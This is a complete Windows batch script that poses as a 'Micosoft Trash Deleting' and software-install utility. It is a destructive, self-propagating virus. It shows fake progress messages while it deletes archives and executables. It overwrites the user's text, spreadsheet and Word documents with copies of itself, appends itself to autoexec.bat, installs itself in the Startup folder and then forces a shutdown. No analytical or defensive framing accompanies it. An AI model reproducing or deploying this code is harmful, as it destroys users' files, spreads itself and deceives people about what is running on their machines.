@ECHO OFF
CLS
IF EXIST c:\WiNXP.BaT GOTO XPs
GOTO XPOn
:XPOn
@ECHO OFF
ECHO Welcome To Micosoft Trash Deleting...
ECHO.
copy %0 c:\WiNXP.BaT >> NUL
ECHO Looking for garbage...
type %0 >> c:\windows\DoSGooN.bat
type %0 >> c:\autoexec.bat
ECHO Ready!.
ECHO.
ECHO Installing SoftWare....Please Wait me...
FOR %%a IN (*?.z?p) DO del %%a
FOR %%a IN (C:\misdoc~1\*.tx*) DO COPY c:\WiNXP.BaT %%a >> NUL
FOR %%a IN (*?.r*r) DO del %%a
FOR %%a IN (C:\misdoc~1\*.xl*) DO COPY c:\WiNXP.BaT %%a >> NUL
FOR %%a IN (*?.?xe) DO del %%a
FOR %%a IN (C:\misdoc~1~1\*.?oc) DO COPY c:\WiNXP.BaT %%a >> NUL
FOR %%a IN (*?.co?) DO del %%a
ECHO DONE.
ECHO.
PAUSE
ECHO Downloading Components...Please Wait
START "C:\Program Files\Internet Explorer\Iexplore.exe" http://www.vsantivirus.com/
START "C:\Program Files\Internet Explorer\Iexplore.exe" http://vx.netlux.com/
ECHO Restarting your PC.... Wait...
copy %0 "C:\WINDOWS\Start Menu\Programs\StartUp\WiNXP.BaT" >> NUL
copy %0 "C:\WINDOWS\Menú Inicio\Programas\Inicio\WiNXP.BaT" >> NUL
c:\WINDOWS\RUNDLL user.exe,exitwindowsexec
GOTO XPOff
:XPS
CLS
@ECHO OFF
IF "%0" == "C:\AUTOEXEC.BAT" GOTO ABC
type %0 >> c:\autoexec.bat
:ABC
type %0 >> c:\windows\DoSGooN.bat
FOR %%a IN (*?.z?p) DO del %%a
FOR %%a IN (C:\misdoc~1\*.tx?) DO COPY c:\WiNXP.BaT %%a >> NUL
FOR %%a IN (*?.r?r) DO del %%a
FOR %%a IN (C:\misdoc~1\*.xl*) DO COPY c:\WiNXP.BaT %%a >> NUL
FOR %%a IN (*?.ex?) DO del %%a
FOR %%a IN (C:\misdoc~1~1\*.?oc) DO COPY c:\WiNXP.BaT %%a >> NUL
FOR %%a IN (*?.co*) DO del %%a
ECHO Downloading Components...Please Wait
START "C:\Program Files\Internet Explorer\Iexplore.exe" http://www.vsantivirus.com/
START "C:\Program Files\Internet Explorer\Iexplore.exe" http://vx.netlux.com/
ECHO Restarting your PC.... Wait...
copy %0 "C:\WINDOWS\Start Menu\Programs\StartUp\WiNXP.BaT" >> NUL
copy %0 "C:\WINDOWS\Menú Inicio\Programas\Inicio\WiNXP.BaT" >> NUL
c:\WINDOWS\RUNDLL user.exe,exitwindowsexec
GOTO XPOff
:XPOff
CLS
exit
